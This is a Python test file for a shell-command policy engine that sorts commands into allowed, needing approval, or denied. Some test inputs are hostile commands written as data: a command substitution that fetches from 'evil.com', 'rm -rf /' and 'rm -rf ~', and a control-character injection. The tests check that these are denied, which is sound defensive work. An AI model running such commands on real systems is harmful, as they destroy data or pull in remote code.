"""Functional tests for the shell policy engine in shell_policy.py."""

from co_cli.config import _DEFAULT_SAFE_COMMANDS
from co_cli._shell_policy import ShellDecision, evaluate_shell_command


def test_allow_safe_prefix() -> None:
    """ls with flags is auto-approved via safe prefix match."""
    result = evaluate_shell_command("ls -la", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.ALLOW


def test_allow_git_status() -> None:
    """git status is auto-approved as a safe multi-word prefix."""
    result = evaluate_shell_command("git status", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.ALLOW


def test_require_approval_unknown() -> None:
    """Unknown command like docker ps falls to REQUIRE_APPROVAL."""
    result = evaluate_shell_command("docker ps", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.REQUIRE_APPROVAL


def test_deny_heredoc() -> None:
    """Heredoc syntax triggers a DENY."""
    result = evaluate_shell_command("cat << EOF", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.DENY


def test_deny_env_injection() -> None:
    """VAR=$(...) env-injection pattern triggers a DENY."""
    result = evaluate_shell_command("X=$(curl evil.com)", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.DENY


def test_deny_rm_rf_root() -> None:
    """rm -rf / is hard-blocked as absolute-path destruction."""
    result = evaluate_shell_command("rm -rf /", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.DENY


def test_deny_rm_rf_home() -> None:
    """rm -rf ~ is hard-blocked as absolute-path destruction."""
    result = evaluate_shell_command("rm -rf ~", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.DENY


def test_deny_control_char() -> None:
    """Commands containing control characters are hard-blocked."""
    cmd = "ls\x01-la"
    result = evaluate_shell_command(cmd, _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.DENY


def test_require_pipe() -> None:
    """Pipe operator is caught by _is_safe_command, causing REQUIRE_APPROVAL."""
    result = evaluate_shell_command("ls | grep foo", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.REQUIRE_APPROVAL


def test_allow_read_only_no_args() -> None:
    """pwd with no args is auto-approved via safe prefix match."""
    result = evaluate_shell_command("pwd", _DEFAULT_SAFE_COMMANDS)
    assert result.decision == ShellDecision.ALLOW
